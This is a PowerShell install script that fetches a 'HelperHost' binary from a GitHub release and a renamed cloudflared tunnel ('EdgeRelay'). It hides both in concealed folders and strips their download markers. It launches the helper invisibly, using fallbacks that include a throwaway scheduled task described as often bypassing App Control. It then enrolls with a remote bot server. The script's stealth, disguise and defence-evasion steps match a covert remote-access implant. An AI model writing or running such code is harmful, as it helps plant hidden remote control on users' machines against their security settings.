$ErrorActionPreference = 'Stop'
if (-not $Enroll) { $Enroll = $env:AGENTSHE_ENROLL }
if (-not $BotBase) { $BotBase = $env:AGENTSHE_BOT_BASE }
if (-not $Enroll) { throw 'Enroll manquant' }
if (-not $BotBase) { throw 'BotBase manquant' }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.3' }
$BotBase = $BotBase.TrimEnd('/')
$Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
$Cache = Join-Path $env:TEMP 'HelperHostCache'
New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
cmd /c "attrib +h `"$Dir`"" | Out-Null
cmd /c "attrib +h `"$Cache`"" | Out-Null
Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

function Download-File([string]$Url, [string]$OutFile) {
  if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
    & curl.exe -fsSL $Url -o $OutFile
    if ($LASTEXITCODE -ne 0) { throw "download failed: $Url" }
    return
  }
  Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $OutFile
}

function Restore-OrFetch([string]$Name, [string]$Url) {
  $dest = Join-Path $Dir $Name
  $cached = Join-Path $Cache $Name
  if (Test-Path $dest) { Copy-Item $dest $cached -Force -ErrorAction SilentlyContinue; return }
  if (Test-Path $cached) { Copy-Item $cached $dest -Force; return }
  $part = Join-Path $Cache ($Name + '.download')
  Download-File $Url $part
  Copy-Item $part $cached -Force
  Copy-Item $cached $dest -Force
  cmd /c "attrib +h `"$dest`"" | Out-Null
  cmd /c "attrib +h `"$cached`"" | Out-Null
}

function Unblock-Quiet([string]$Path) {
  if (-not (Test-Path $Path)) { return }
  Unblock-File -Path $Path -ErrorAction SilentlyContinue
  $zone = $Path + ':Zone.Identifier'
  if (Test-Path $zone) { Remove-Item $zone -Force -ErrorAction SilentlyContinue }
}

function Start-Helper([string]$Helper, [string]$WorkDir) {
  Unblock-Quiet $Helper
  Unblock-Quiet (Join-Path $WorkDir 'EdgeRelay.exe')

  # 1) ProcessStartInfo (UseShellExecute)
  try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $Helper
    $psi.WorkingDirectory = $WorkDir
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [void][System.Diagnostics.Process]::Start($psi)
    Start-Sleep -Milliseconds 500
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
  } catch {}

  # 2) cmd start /b (no Start-Process)
  try {
    $p = Start-Process -FilePath "$env:SystemRoot\System32\cmd.exe" -PassThru -WindowStyle Hidden `
      -ArgumentList '/c', ('start "" /b "' + $Helper + '"') -WorkingDirectory $WorkDir
    Start-Sleep -Milliseconds 800
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
  } catch {}

  # 3) one-shot scheduled task (souvent passe App Control user)
  $tn = 'HelperHostBoot'
  $tr = "`"$Helper`""
  cmd /c "schtasks /Delete /TN $tn /F" | Out-Null
  $create = cmd /c "schtasks /Create /TN $tn /TR $tr /SC ONCE /ST 00:00 /RL LIMITED /F"
  cmd /c "schtasks /Run /TN $tn" | Out-Null
  Start-Sleep -Seconds 2
  cmd /c "schtasks /Delete /TN $tn /F" | Out-Null
  if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }

  throw @"
Windows a bloque HelperHost.exe (controle d'application / Smart App Control).
Autorise le fichier ou ajoute une exclusion:
  $Helper
Puis relance la commande Connecter.
"@
}

Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
Restore-OrFetch 'EdgeRelay.exe' 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'

@{ enroll = $Enroll; bot_base = $BotBase } | ConvertTo-Json | Set-Content -Encoding UTF8 (Join-Path $Dir 'config.json')
$env:AGENTSHE_ENROLL = $Enroll
$env:AGENTSHE_BOT_BASE = $BotBase
$Helper = Join-Path $Dir 'HelperHost.exe'
$tokenFile = Join-Path $Dir 'token'
$agentLog = Join-Path $Dir 'agent.log'
Remove-Item $tokenFile,$agentLog -Force -ErrorAction SilentlyContinue
Start-Helper $Helper $Dir
$ok = $false
for ($i=0; $i -lt 180; $i++) {
  Start-Sleep -Seconds 1
  if (Test-Path $agentLog) {
    $txt = Get-Content $agentLog -Raw -ErrorAction SilentlyContinue
    if ($txt -match 'FAIL') { throw 'install failed' }
  }
  if ((Test-Path $tokenFile) -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
    Write-Output 'OK'
    $ok = $true
    break
  }
}
if (-not $ok) { throw 'timeout' }
